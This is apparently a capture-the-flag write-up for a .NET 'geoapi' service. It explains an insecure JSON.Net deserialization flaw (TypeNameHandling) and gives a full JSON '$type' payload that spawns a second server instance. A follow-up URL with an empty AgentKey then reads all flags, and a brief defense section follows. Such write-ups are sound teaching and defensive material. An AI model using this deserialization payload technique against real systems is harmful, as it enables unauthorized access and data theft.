# geoapi

This service is simple .net core http server.

### Attack

This service uses JSON.Net with `TypeNameHandling = true` for HTTP content deserialization. Both DTO constructors contain optional argument `ILoggerProveder loggerProvieder` therefore it is possible to construct any type that implements ILoggerProvider. The only suitable type is `HTTPServer`, so you can run a new instance of the service by constructing HTTPServer with setting `AgentIdSize = 0`.

```{  
   "agentName":"lol",
   "loggerProvider":{  
      "$type":"geoapi.HTTP.HttpServer, geoapi",
      "settings":{  
         "$type":"geoapi.Utils.Settings, geoapi",
         "ParallelismDegree":500,
         "Port":9007,
         "MongoDBConnectionString":"mongodb://localhost:27017",
         "AgentsCollectionName":"AgentsCollection",
         "MongoDBName":"AgentsDB",
         "TObjectsCollectionName":"TObjecstCollection",
         "MaxContentLength":0,
         "AgentIdSize":0,
         "ObjectIdSize":12,
         "SearchLimit":100,
         "TTL":"01:30:00"
      }
   }
}
```

After that you can register the user with an empty token and read all flags using `GetTerrainObjectsHandler` like this `http://host:port/objects?AgentKey=`.

### Defense
You can rebuild service with disabled `TypeNameHandling` or fliter `$type` field
